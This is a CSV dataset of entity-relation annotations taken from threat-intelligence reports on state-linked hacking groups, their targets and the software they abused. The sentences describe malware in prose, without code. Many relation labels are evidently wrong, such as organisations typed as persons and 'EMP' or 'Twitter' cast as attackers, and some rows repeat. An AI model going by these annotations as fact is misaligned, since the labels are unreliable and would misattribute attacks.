"FileName","RelationType","Entity1Mention","Entity1Type","Entity2Mention","Entity2Type","Context"
"DEEP_PANDA_Sakula","hasproduct","Microsoft","ORG","ActiveX Control","PRODUCT","All incidents in this campaign were similar in that they utilized malicious droppers masquerading as installers for legitimate software applications like Adobe Reader , Juniper VPN , and Microsoft ActiveX Control . "
"Kaspersky_Lab_crouching_yeti_appendixes_eng_final","hasproduct","Adobe","ORG","Reader","PRODUCT","The original 0 - day exploiting this Adobe Reader vulnerability targeted icucnv34.dll . "
"XSLCmd_OSX","hasattacklocation","“IceFog","ORG","Japan","GPE","In 2013 , Kaspersky reported on a threat actor group they named “ IceFog ” that had been attacking a large number of entities related to military , mass media , and technology in South Korea and Japan . "
"ICS_Havex_backdoors","hasproduct","Dragonfly","ORG","""Energetic Bear""","PRODUCT","The Havex backdoor is developed and used by a hacker group called Dragonfly , who are also known as "" Energetic Bear "" and "" Crouching Yeti "" . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","EMP","ORG","North Korea","GPE","The regime ’s CSTIA relies on Russia as one of several sources for technical data.253 North Korea also sends some of its cyber warriors to train in Russia,254 and the regime reportedly acquired its EMP technology from there.255 Political ties between Russia and North Korea have become stronger in recent months . In 2014 , potentially as a result of the U.S. response to the Russian - Ukranian conflict , Russia began to strengthen ties with North Korea . Negotiations reportedly included promises of trade and development projects . Narushige Michishita , a North Korea and Asia security expert at Japan 's National Graduate Institute for Policy Studies , stated “ By strengthening its relationship with North Korea , Russia is trying to enhance its bargaining position vis - à - vis the United States and Japan . "
"XSLCmd_OSX","hasproduct","Microsoft","ORG","Word","PRODUCT","In 2012 , AlienVault discovered a document file exploiting an older vulnerability in Microsoft Word that installs a backdoor named “ MacControl ” on OS X systems . "
"Targeting_Syrian_ISIS_Critics","hasattacklocation","ISIS","ORG","Turkey","GPE","Given that the identities and locations of RSS members are closely guarded , such information would hold significant intelligence value for ISIS . Armed with this kind of information , ISIS could physically harm people within Raqqah ( and it is also possible that they have the ability to operate in some capacity in border areas of Turkey ) . "
"Dragonfly_Threat_Against_Western_Energy_Suppliers","hasattacklocation","Energetic Bear","ORG","Canada","GPE","The Dragonfly group , which is also known by other vendors as Energetic Bear , are a capable group who are evolving over time and targeting primarily the energy sector and related industries . They have been in operation since at least 2011 but may have been active even longer than that . Dragonfly initially targeted defense and aviation companies in the US and Canada before shifting its focus to US and European energy firms in early 2013 . "
"Cylance_Operation_Cleaver_Report","hasattacklocation","Cleaver","PERSON","China","GPE","The Cleaver team targets some of the most sensitive global critical infrastructure companies in the world , including military , oil and gas , airlines , airports , energy producers , utilities , transportation , healthcare , telecommunications , technology , manufacturing , education , aerospace , Defense Industrial Base ( DIB ) , chemical companies and governments . Countries impacted include Canada , China , England , France , Germany , India , Israel , Kuwait , Mexico , Pakistan , Qatar , Saudi Arabia , South Korea , Turkey , United Arab Emirates , and the US . "
"ICS_Havex_backdoors","hasattacklocation","Dragonfly","ORG","Canada","GPE","The vendors who have gotten their software trojanized by Dragonfly are all European ICS companies ( Switzerland , Belgium and Germany ) . Additionally , only the mbCHECK version for users in Europe was infected with Havex , but not the one for US / Canada . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","EMP","ORG","Russia","GPE","The regime ’s CSTIA relies on Russia as one of several sources for technical data.253 North Korea also sends some of its cyber warriors to train in Russia,254 and the regime reportedly acquired its EMP technology from there.255 Political ties between Russia and North Korea have become stronger in recent months . In 2014 , potentially as a result of the U.S. response to the Russian - Ukranian conflict , Russia began to strengthen ties with North Korea . "
"fireeye-operation-quantum-entanglement","hasattacklocation","CHINANET","ORG","Japan","GPE","This server was also located in the Guangdong Province and operated by CHINANET . In short , the Moafee group was observed consistently hosting their backend HTRAN servers in Guangdong . This observation may reveal that the Moafee group is physically located in this province . Campaign # 2 : DragonOK We have observed the DragonOK group target high - technology and manufacturing companies in both Japan and Taiwan . "
"Mo' Shells Mo' Problems - File List Stacking »","hasproduct","Adobe","ORG","Cold Fusion","PRODUCT","In the case of web shells , there are certain search criteria we may want to adopt to speed up our efforts : · If the environment is a mix of Windows Server and other web hosting solutions ( such as Apache Tomcat and Adobe Cold Fusion ) , search for extensions of ASP , ASPX , JSP , PHP and CFM . "
"GData_Uroburos_RedPaper_EN_v1","hasproduct","Microsoft","ORG","Windows","PRODUCT","Uroburos supports 32 - bit and 64 - bit Microsoft Windows systems . "
"Dragonfly_Threat_Against_Western_Energy_Suppliers","hasattacklocation","Dragonfly","ORG","Canada","GPE","The Dragonfly group , which is also known by other vendors as Energetic Bear , are a capable group who are evolving over time and targeting primarily the energy sector and related industries . They have been in operation since at least 2011 but may have been active even longer than that . Dragonfly initially targeted defense and aviation companies in the US and Canada before shifting its focus to US and European energy firms in early 2013 . "
"w32_regin_stage_1","hasproduct","Microsoft","ORG","Windows","PRODUCT","Our analysis covers a collected set of 27 32 - bit Portable Executable ( PE ) files for the Microsoft Windows operating system . "
"darkhotel_kl_07.11","hasproduct","Microsoft","ORG","Windows","PRODUCT","Microsoft is providing an update for all supported releases of Microsoft Windows that revokes the trust in DigiCert Sdn . Bhd . "
"unveilingthemask_v1.0","hasproduct","Microsoft","ORG","Windows","PRODUCT","Installation module - Microsoft Windows version The “ Careto ” software package is installed using a standalone executable installer . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Sin","PERSON","North Korea","GPE","According to a 2009 report by Major Steve Sin , an intelligence analyst at U.S. Forces Korea , North Korean hackers have successfully penetrated U.S. defense networks more frequently than any other country that has targeted U.S. defense assets.7 While Major Sin may have been overly optimistic about North Korea ’s abilities , it is clear that they should not be underestimated . Frank Cilluffo , co - director of the Cyber Center for National and Economic Security at George Washington University , testified before Congress that North Korea ’s cyber capability "" poses an important ' wild card ' threat , not only to the United States but also to the region and broader international stability … ""8 "
"group-3279-targets-the-video-game-industry","hasattacklocation","Twitter","ORG","the Guangdong Province","GPE","Twitter accounts such as FireEye and SecurityTube , many penetration testers , and offensive - security Twitter accounts such as Nikita Tarajanov from Russia and a self - described "" Botmaster , TrueCrober , CreditCardFucker , Fraudmaster "" based in "" cardaland "" who posts in Russian . Based upon the geolocation data associated with Weibo posts , the Sincoder ( 2bcoder ) threat actor appears to live near Kefa Road in the Nanshan District of the Guangdong Province in Shenzhen , China as of this publication , and may be af.liated with the Wuhan University of Technology . "
"ICS_Havex_backdoors","hasattacklocation","Dragonfly","ORG","Switzerland","GPE","The vendors who have gotten their software trojanized by Dragonfly are all European ICS companies ( Switzerland , Belgium and Germany ) . "
"darkhotel_kl_07.11","hasproduct","GoogleToolbar","ORG","Windows Messenger","PRODUCT","These might be GoogleToolbar , Adobe flash , Windows Messenger , etc . "
"Cylance_Operation_Cleaver_Report","hasattacklocation","Cleaver","PERSON","Iran","GPE","The evidence and indicators of compromise we provide in this report will allow potentially unaware victims to detect and eliminate Cleaver ’s incursions into their networks . BACKGROUND Iran has been severely impacted by debilitating and extremely advanced malware campaigns since at least 2009 . Famous examples of these efforts include industrial sabotage via Stuxnet ( 2009 - 2010 ) , and espionage with Duqu ( 2009 - 2011 ) as well as Flame ( 2012 ) . These campaigns have targeted Iran ’s nuclear program , and oil and gas operations . "
"Cylance_Operation_Cleaver_Report","hasattacklocation","Cleaver","PERSON","South Korea","GPE","In fact , oil and gas was a particular focal point for the Cleaver team , going after no less than nine of these companies around the world . Universities were targeted in the US , India , Israel , and South Korea . "
"fireeye-operation-quantum-entanglement","hasattacklocation","Moafee","ORG","Japan","GPE","The Moafee campaign targets government and military organizations in countries with national interests in the South China Sea . In contrast , the DragonOK campaign has been observed targeting high - technology and manufacturing companies in Japan and Taiwan . "
"Cylance_Operation_Cleaver_Report","hasproduct","Microsoft","ORG","Windows","PRODUCT","MS08 - 067 Exploit MS08 - 067 is a vulnerability in Microsoft Windows made popular by the Conficker worm which can be exploited by a specially crafted packet to the operating system ’s RPC network interface . "
"EB-YetiJuly2014-Public","indicates","2.2.5","CARDINAL","The Karagany Backdoor      1. Description    Karagany","WORK_OF_ART","2.2.5 The Karagany Backdoor 1 . Description Karagany is a simple backdoor that connects to the C&C and keeps waiting for commands . "
"group-3279-targets-the-video-game-industry","hasattacktime","PDB","ORG","Sunday, October 30, 2011","DATE","The PDB string is included at compilation time and provides insight into the directory structure of the computer used to compile the executable . The gsi.exe example shown in Figure 1 illustrates the use of the "" laurentiumoon "" username on the originating host and shows that the original program was named "" getosinfo "" . According to the PETimeDateStamp , this example was compiled on Sunday , October 30 , 2011 at 16:42:30 UTC . "
"Cylance_Operation_Cleaver_Report","hasattacklocation","AppUsageIds","ORG","Kuwait","GPE","From August 23 to August 26 , 2014 , new versions of TinyZBot were compiled with the AppUsageIds targeting major oil and gas companies in Qatar and Kuwait , Ministries of Foreign Affairs in the Persian Gulf , and a major airline holding company in UAE . "
"darkhotelappendixindicators_kl_1.1","hasproduct","Mozilla","ORG","Firefox","PRODUCT","After that , the mod­ule collects information about current system which includes the following : • Network adapter MAC address • CPU Name and Identifier • System default codepage • Windows OS and Service Pack versions • Hostname and IP address • Local user name • Cached passwords from Internet Explorer 6/7/8/9 ( Protected Storage and IntelliForms ) • Mozilla Firefox stored secrets ( < 12.0 ) • "
"FTA 1012 STTEAM Final","indicates","11:20:54 UTC","TIME","English","LANGUAGE","Magic ISO-8859 English text , with very long lines , with CRLF line terminators TrID HyperText Markup Language ( 100.0 % ) First submission 2006 - 12 - 21 19:09:51 UTC ( 7 years , 2 months ago ) 35 / 48 Last submission 2013 - 08 - 01 11:20:54 UTC ( 6 months , 2 weeks ago ) "
"Cylance_Operation_Cleaver_Report","hasattacklocation","TinyZBot","ORG","Qatar","GPE","The third is a new Binder_1 instance , which contains one of the TinyZBot instances compiled that day . The legitimate application included in this binder is called Easy_resume_creator and is a legitimate application named EasyRésuméCreatorPro . This version targeted a major Saudi Arabian oil company . From August 23 to August 26 , 2014 , new versions of TinyZBot were compiled with the AppUsageIds targeting major oil and gas companies in Qatar and Kuwait , Ministries of Foreign Affairs in the Persian Gulf , and a major airline holding company in UAE . "
"GDATA_TooHash_CaseStudy_102014_EN_v1","hasproduct","Microsoft","ORG","Word","PRODUCT","The mentioned exploit causes Microsoft Word to crash , which might alert attacked users just right away . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Mitsuhiro Suganuma","PERSON","Japan","GPE","According to Mitsuhiro Suganuma , former section head of the second intelligence department of the Japanese Public Security Intelligence Agency ( PSIA ) , “ Chongryon is virtually under the direct control of the Liaison Department of the Workers ’ Party of Korea , which has been in charge of North Korea ’s covert operations and underground activities against South Korea . Chongryon in Japan has been a strong support organization aimed at bringing a revolution in South Korea , or a red unification by force . ” "
"fireeye-operation-quantum-entanglement","hasattacklocation","CHINANET","ORG","Taiwan","GPE","This server was also located in the Guangdong Province and operated by CHINANET . In short , the Moafee group was observed consistently hosting their backend HTRAN servers in Guangdong . This observation may reveal that the Moafee group is physically located in this province . Campaign # 2 : DragonOK We have observed the DragonOK group target high - technology and manufacturing companies in both Japan and Taiwan . "
"GDATA_TooHash_CaseStudy_102014_EN_v1","hasattacklocation","TooHash","PERSON","China","GPE","Have a look at two examples used during the TooHash campaign : * .cnnic - micro.com CNNIC is the acronym for China National Network Information Center . It is the administrative agency for the Internet domain administration in mainland China . "
"Cylance_Operation_Cleaver_Report","hasproduct","Microsoft","ORG","Windows","PRODUCT","PrivEsc PrivEsc is a blatant plagiarism of an existing exploit for Microsoft Windows released in January 2010 called MS10 - 015 , “ Vulnerabilities in Windows Kernel Could Allow Escalation of Privilege ” , popularly known as the KiTrap0D exploit which was released publicly . "
"GDATA_TooHash_CaseStudy_102014_EN_v1","hasattacklocation","TooHash","ORG","Taiwan","GPE","Targets The analyzed samples used in the “ TooHash ” campaign were Microsoft Office documents , and were submitted to us from a Taiwanese customer . An indication leading to the target area is one of the documents used by the attackers , which contained the string “ 102 .... ” which means “ end of the year 102 ” . The official calendar used in Taiwan starts in 1912 ( year 1 ) , so the year 102 is the year 2013 according to the Gregorian calendar ( 1911 + 102=2013 ) . "
"LeoUncia_OrcaRat","indicates","16","CARDINAL","two","CARDINAL","Putting back pieces together , we have the following algorithm for LeoUncia : D = rc4(custom_debase64(E)[:16]).decrypt(custom_debase64(E)[16 :] ) The two samples both share a "" custom "" Base64 encoding with the use of RC4 ; nothing fabulous , but it is a start . "
"Group_72","hasattacklocation","Operation SMN","ORG","Japan","GPE","Group 72 is a long standing threat actor group involved in Operation SMN , named Axiom by Novetta . The group is sophisticated , well funded , and possesses an established , defined software development methodology . The group targets high profile organizations with high value intellectual property in the manufacturing , industrial , aerospace , defense , media sectors . Geographically , the group almost exclusively targets organizations based in United States , Japan , Taiwan , and Korea . "
"fireeye-operation-quantum-entanglement","hasattacklocation","DragonOK","ORG","the Jiangsu province","GPE","For approximately one week , between July 31 , 2013 and August 8 , 2013 , the domain www.ndbssh[.]com served as a command and control server for Mongall payloads distributed by the DragonOK group . During this time , DragonOK also ran an HTRAN proxy client on www.ndbssh[.]com . This HTRAN client was seen attempting to connect to three different HTRAN servers located in the Jiangsu province and operated by CHINANET . "
"Turla_2_Penquin","hasproduct","Intel","ORG","80386","PRODUCT","Turla.gen General executable characteristics : ELF 32 - bit LSB executable , Intel 80386 , version 1 ( SYSV ) , statically linked , for GNU / Linux 2.2.5 , stripped Statically linked libraries : glibc2.3.2 -the GNU C library openssl "
"wp-operation-pawn-storm","targets","Firefox®","ORG","JavaScript","PRODUCT","The attacks worked on any popular browser such as Firefox ® , Safari ® , Chrome ™ , and Internet Explorer ® . No vulnerabilities need to be exploited for the JavaScript to work . "
"Group_72","hasproduct","Operation SMN","ORG","Axiom","PRODUCT","Group 72 is a long standing threat actor group involved in Operation SMN , named Axiom by Novetta . "
"Kaspersky_Lab_whitepaper_Regin_platform_eng","hasproduct","Windows","ORG","NT","PRODUCT","Originally , these were implemented in Windows NT for compatibility with OS/2 applications ; however , they made their way into later versions of Windows , namely 2000 , XP and Vista . "
"Cylance_Operation_Cleaver_Report","hasproduct","Microsoft","ORG","Windows","PRODUCT","Compromised systems include Microsoft Windows web servers running IIS and ColdFusion , Apache with PHP , many variants of Microsoft Windows desktops and servers , and Linux servers . "
"Cylance_Operation_Cleaver_Report","hasproduct","Microsoft","ORG","Windows","PRODUCT","Compromised systems include Microsoft Windows web servers running IIS and ColdFusion , Apache with PHP , many variants of Microsoft Windows desktops and servers , and Linux servers . "
"Cylance_Operation_Cleaver_Report","hasattacklocation","AppUsageIds","ORG","Qatar","GPE","From August 23 to August 26 , 2014 , new versions of TinyZBot were compiled with the AppUsageIds targeting major oil and gas companies in Qatar and Kuwait , Ministries of Foreign Affairs in the Persian Gulf , and a major airline holding company in UAE . "
"group-3279-targets-the-video-game-industry","hasattacklocation","Nikita Tarajanov","PERSON","the Guangdong Province","GPE","Twitter accounts such as FireEye and SecurityTube , many penetration testers , and offensive - security Twitter accounts such as Nikita Tarajanov from Russia and a self - described "" Botmaster , TrueCrober , CreditCardFucker , Fraudmaster "" based in "" cardaland "" who posts in Russian . Based upon the geolocation data associated with Weibo posts , the Sincoder ( 2bcoder ) threat actor appears to live near Kefa Road in the Nanshan District of the Guangdong Province in Shenzhen , China as of this publication , and may be af.liated with the Wuhan University of Technology . "
"HPSR SecurityBriefing_Episode16_NorthKorea","indicates","Jokra","WORK_OF_ART","two","CARDINAL","However , the two malware types both use the same packer ' Jokra ' and both contain the strings “ HASTATI "" and "" PRINCPES”.387 387 CrowdStrike Intelligence Report CSIR-13013 388 http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf 389 http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/5 390 http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf 391 http://www.theguardian.com/world/2009/jul/11/south-korea-blames-north-korea-cyber-attacks 392 http://binarycore.org/2012/05/30/investigating-north-koreas-netblock-part-3-topology/ 393 http://38north.org/2010/09/speak-loudly-and-carry-a-small-stick-the-north-korean-cyber-menace/ 394 http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf 395 http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf "
"GData_Uroburos_RedPaper_EN_v1","indicates","Uroburos","PRODUCT","three","CARDINAL","We decided to investigate in depth soon after we identified the following three interesting aspects : . the usage of virtual file systems . the complexity of the framework . the advanced network capabilities Uroburos ’ name Uroburos is a direct reference to the Greek word Ouroboros ( .... ß .... ) . "
"unveilingthemask_v1.0","hasproduct","Apple","ORG","iOS","PRODUCT","This includes an extremely sophisticated malware , a rootkit , a bootkit , 32- and 64 - bit Windows versions , Mac OS X and Linux versions and possibly versions for Android and iPad / iPhone ( Apple iOS ) . "
"fireeye-operation-quantum-entanglement","hasattacklocation","DragonOK","ORG","Guangdong province","GPE","In contrast , the DragonOK campaign has been observed targeting high - technology and manufacturing companies in Japan and Taiwan .  The campaigns maintain separate back - end command and control infrastructures hosted in different provinces in Mainland China . The Moafee campaign can be traced to infrastructure located in the Guangdong province , whereas the DragonOK campaign can be traced to infrastructure located in the Jiangsu province . "
"fireeye-operation-quantum-entanglement","hasattacklocation","Moafee","ORG","China","GPE","We have also observed the Moafee group target organizations within the US defense industrial base . 1 http://www.technologyreview.com/view/427174/einsteins-spooky-action-at-a-distance-paradox­2 http://www.secureworks.com/cyber-threat-intelligence/threats/htran/ 3 http://en.wikipedia.org/wiki/South_China_Sea#Resources 4 http://www.ifri.org/downloads/ifricanonopedseamanecs.pdf 5 http://www.eia.gov/countries/regions-topics.cfm?fips=scs Figure 1 : Two attack groups with common TTPs The attack group “ DragonOK ” ( named after an event name in one of their payload executables 6 ) appears to operate out of the Jiangsu province in China , and is known to target high - tech and manufacturing companies in Japan and Taiwan . "
"Kaspersky_Lab_crouching_yeti_appendixes_eng_final","hasproduct","Microsoft","ORG","Explorer","PRODUCT","After the debug message “ RegIeDir ” , the following registry key is opened “ HKEY_CURRENT_USER\\ SOFTWARE\\Microsoft\\Internet Explorer ” and the subkey “ InternetRegistry ” is checked . "
"Kaspersky_Lab_crouching_yeti_appendixes_eng_final","hasproduct","CreateFileA CreateFileMappingA MapViewOfFile","ORG","the Yeti ROP","PRODUCT","Function call chains for both the Yeti ROP and the msf ROP are as follows : CreateFileA CreateFileMappingA MapViewOfFile save and load the saved mapping ptr memcpy ret back into shellcode for Havex file write to % temp% and execute "
"ZoxPNG_Full_Analysis-Final","hasproduct","HttpOpenRequest","ORG","APIs","PRODUCT","ZoxPNG uses the InternetOpen , InternetConnect and HttpOpenRequest APIs to begin a HTTP connection to the C2 server . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Narushige Michishita","PERSON","North Korea","GPE","Narushige Michishita , a North Korea and Asia security expert at Japan 's National Graduate Institute for Policy Studies , stated “ By strengthening its relationship with North Korea , Russia is trying to enhance its bargaining position vis - à - vis the United States and Japan . "
"fireeye-sidewinder-targeted-attack","hasproduct","Google Play","ORG","MTP","PRODUCT","We used the FireEye Mobile Threat Prevention ( MTP ) engine to analyze all of the ~73,000 popular apps from Google Play with more than 50,000 downloads , and identified 93 ad libraries . "
"fireeye-operation-quantum-entanglement","hasattacklocation","DragonOK","ORG","Jiangsu province","GPE","This observation may reveal that the DragonOK group is physically located in the Jiangsu province . "
"Deep in Thought_ Chinese Targeting of National Security Think Tanks »","hasattacklocation","DEEP PANDA","ORG","China","GPE","For almost three years now , CrowdStrike has monitored DEEP PANDA targeting critical and strategic business verticals including : government , defense , financial , legal , and the telecommunications industries . At the think tanks , Falcon Host detected targeting of senior individuals involved in geopolitical policy issues , in particular in the China / Asia Pacific region . "
"Miniduke_twitter","hasattacklocation","Twitter","ORG","France","GPE","In an effort to discover potential victims , we registered the Twitter accounts corresponding to the current week both for the main and TwitterJS components and set up tweets with encrypted URLs so that an infected computer would reach out to our server . So far we have received connections via the TwitterJS accounts from four computers located in Belgium , France and the UK . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","the No. 91 Office and Unit 121","ORG","China","GPE","The RGB reportedly has a special operations forces ( SOF ) element118 and oversees six bureaus that specialize in operations , reconnaissance , technology and cyber matters , overseas intelligence collection , inter - Korean talks , and service support.119 Two of these bureaus have been identified as the No . 91 Office and Unit 121 . The No . 91 Office , an office responsible for hacking , operates out of the Mangkyungdae - district of Unit 121 comprises both an intelligence component and an attack component . One of Unit 121 ’s command posts is Chilbosan Hotel in Shenyang , China . "
"Group72_Opening_ZxShell","hasproduct","ZwAllocateVirtualMemory","ORG","Kernel API","PRODUCT","In this manner , ZxShell is able to completely hide itself , intercepting the following Kernel API calls : ZwAllocateVirtualMemory , ZwOpenEvent , ZwQueryDirectoryFile , ZwWriteFile , ZwEnumerateKey , and ZwDeviceIoControlFile . Command and Control Server Sample ( SHA256 : 1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c ) is configured to act as a server . "
"Group72_Opening_ZxShell","hasproduct","ZwWriteFile","ORG","ZwDeviceIoControlFile.   Command and Control Server  Sample","PRODUCT","In this manner , ZxShell is able to completely hide itself , intercepting the following Kernel API calls : ZwAllocateVirtualMemory , ZwOpenEvent , ZwQueryDirectoryFile , ZwWriteFile , ZwEnumerateKey , and ZwDeviceIoControlFile . Command and Control Server Sample ( SHA256 : 1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c ) is configured to act as a server . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Instagram","ORG","China","GPE","Visiting reporter Jean H. Lee purportedly used this 3 G network to post to both Twitter and Instagram . However , citizens are not generally allowed to use the 3 G network.75 Email is also regulated by the regime . The first email provider in North Korea was Silibank . Silibank has servers in Pyongyong and Shenyang and is a joint venture with China . "
"wp-operation-pawn-storm","hasproduct","Microsoft","ORG","Excel","PRODUCT","The email had two Microsoft Excel ® file attachments named “ APEC Media list 2013 Part1.xls , ” which exploited CVE-2012 - 0158 , and “ APEC Media list 2013 Part2.xls , ” which was nonmalicious . "
"Cylance_Operation_Cleaver_Report","hasproduct","Cisco","ORG","Stuxnet","PRODUCT","Compromised network infrastructure included Cisco VPNs as well as Cisco switches and routers . Unlike Stuxnet , no exotic exploitations ( such as 0 - days ) were observed . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","Christian Whiton","PERSON","Korea","GPE","Christian Whiton , a former deputy envoy to North Korea , noted that following Kim Jong Un ’s rise to power , “ the regime still acts in a very belligerent manner , but it seems less predictable , and more random . ” Ellen Kim , assistant director of the Korea Chair at the Center for Strategic and International Studies , assessed the situation thusly : “ Since [ Kim Jong Un ] took power he has purged almost all of his elder guardians ... and filled his surroundings with new faces . "
"ThreatConnect_Operation_Arachnophobia_Report","hasattacklocation","Tranchulas","ORG","Pakistan","GPE","During the past year , we communicated with Tranchulas and the Pakistan - based hosting provider . Suspicious responses and oddly similar replies received from both companies to our inquiries , as well as anomalies in their email headers , prompted us to research the companies further . Our research revealed : • The C2 hosting provider ( VPSNOC ) has likely been conducting business operations from within Pakistan , subleasing infrastructure from U.S. providers . "
"fireeye-operation-quantum-entanglement","hasattacklocation","Moafee","ORG","Japan","GPE","In short , the Moafee group was observed consistently hosting their backend HTRAN servers in Guangdong . This observation may reveal that the Moafee group is physically located in this province . Campaign # 2 : DragonOK We have observed the DragonOK group target high - technology and manufacturing companies in both Japan and Taiwan . "
"OnionDuke_Tor","hasattacklocation","the Lab  Recently","ORG","Russia","GPE","Via the Tor Network -F - Secure Weblog : News from the Lab Recently , research was published identifying a Tor exit node , located in Russia , that was consistently and maliciously modifying any uncompressed Windows executables downloaded through it . "
"group-3279-targets-the-video-game-industry","hasattacklocation","Nikita Tarajanov","PERSON","Shenzhen","GPE","Twitter accounts such as FireEye and SecurityTube , many penetration testers , and offensive - security Twitter accounts such as Nikita Tarajanov from Russia and a self - described "" Botmaster , TrueCrober , CreditCardFucker , Fraudmaster "" based in "" cardaland "" who posts in Russian . Based upon the geolocation data associated with Weibo posts , the Sincoder ( 2bcoder ) threat actor appears to live near Kefa Road in the Nanshan District of the Guangdong Province in Shenzhen , China as of this publication , and may be af.liated with the Wuhan University of Technology . "
"Group_72","hasattacklocation","Novetta","ORG","Japan","GPE","Group 72 is a long standing threat actor group involved in Operation SMN , named Axiom by Novetta . The group is sophisticated , well funded , and possesses an established , defined software development methodology . The group targets high profile organizations with high value intellectual property in the manufacturing , industrial , aerospace , defense , media sectors . Geographically , the group almost exclusively targets organizations based in United States , Japan , Taiwan , and Korea . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasattacklocation","EMP","ORG","Russia","GPE","The regime ’s CSTIA relies on Russia as one of several sources for technical data.253 North Korea also sends some of its cyber warriors to train in Russia,254 and the regime reportedly acquired its EMP technology from there.255 Political ties between Russia and North Korea have become stronger in recent months . "
